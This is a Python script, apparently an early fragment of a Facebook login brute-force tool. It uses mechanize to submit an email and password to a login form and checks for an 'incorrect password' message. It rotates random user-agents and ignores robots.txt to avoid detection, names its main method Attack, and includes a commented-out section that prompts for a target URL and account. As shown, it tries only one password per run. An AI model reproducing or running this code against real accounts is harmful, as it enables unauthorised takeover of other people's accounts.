#!/usr/bin/python
import mechanize
import random,os,sys,time
import color


class __ghs__:
  def __init__(self,data):
    self.url = data["url"]
    self.email = data["email"]
    self.password = data["password"]
  
  
  def Attack (self):
    
    browser = mechanize.Browser()
    #browser.addheaders = [('User-Agent',headers['User-Agent'])]
    browser.addheaders=[('User-agent',random.choice([
               'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.24 (KHTML, like Gecko) RockMelt/0.9.58.494 Chrome/11.0.696.71 Safari/534.24',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.47 Safari/537.36',
               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.54 Safari/535.2',
               'Opera/9.80 (J2ME/MIDP; Opera Mini/9.80 (S60; SymbOS; Opera Mobi/23.348; U; en) Presto/2.5.25 Version/10.54',
               'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.12 Safari/535.11',
               'Mozilla/5.0 (Windows NT 5.1) AppleWebKit/535.6 (KHTML, like Gecko) Chrome/16.0.897.0 Safari/535.6',
               'Mozilla/5.0 (X11; Linux x86_64; rv:17.0) Gecko/20121202 Firefox/17.0 Iceweasel/17.0.1']))]
    browser.set_handle_robots(False)
    response = browser.open(self.url)
    browser.select_form(nr=0)
    browser.form['email'] = self.email
    browser.form['pass'] = self.password
    response = browser.submit()
    response_data = response.read()
    data = response_data.decode()
    #self.saveFile(data)
    if "The password you entered is incorrect." in data:
      print("Incorrect Password")

  def saveFile(self,data):
    f = open("index.html","r+")
    f.write(data)
    f.close()


  def _load(self,z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.09)
  
  


"""

url = "https://free.facebook.com"
email = 'test@gmail.com'
password = 'test1234:'

data = {
  "url"  :url,
  "email" : email,
  "password" : password
}

os.system("bash logo.sh")
attack = __ghs__(data)
#attack.Attack()
print('\n')
attack._load(color.YELLOW+"[-] "+color.RED+color.BOLD+"Please Wait...\n")
attack._load(color.YELLOW+"[-] "+color.GREEN+color.BOLD+"System Intilizing...")
os.system("clear")
os.system("bash logo.sh")

###  GETTING INPUTS FROM USERS
url = str(input(color.RED+"\n[+] "+color.GREEN+color.BOLD+"ENTER LOGIN URL : "+color.YELLOW))

if url:
  email = str(input(color.RED+"\n[+] "+color.GREEN+color.BOLD+"ENTER USER EMAIL/PHONE/PROFILE : "+color.YELLOW))
else:
  print (color.RED+"\n[!] "+color.BOLD+color.RED+"Please Enter URL !")
  time.sleep(2)
  os.system("clear")
  os.system("bash logo.sh")
  url = str(input(color.RED+"\n[+] "+color.GREEN+color.BOLD+"ENTER LOGIN URL : "+color.YELLOW))


#attack = __ghs__(data)
"""